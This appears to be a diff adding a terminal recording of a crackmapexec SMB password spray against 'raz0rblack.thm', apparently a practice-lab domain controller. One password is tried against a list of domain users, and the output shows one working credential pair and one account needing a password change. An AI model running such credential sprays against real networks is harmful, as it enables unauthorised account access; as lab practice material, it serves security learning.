@@ -1,0 +1,18 @@
+Script started on 2025-04-08 14:42:54+03:00 [COMMAND="crackmapexec smb raz0rblack.thm -u users.list -p password.list" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[35m[-][0m raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\clin:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\xyan1d3:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[31m[-][0m raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
+[1m[34mSMB[0m         raz0rblack.thm  445    HAVEN-DC         [1m[32m[+][0m raz0rblack.thm\twilliams:roastpotatoes [1m[33m[0m
+
+Script done on 2025-04-08 14:43:35+03:00 [COMMAND_EXIT_CODE="0"]
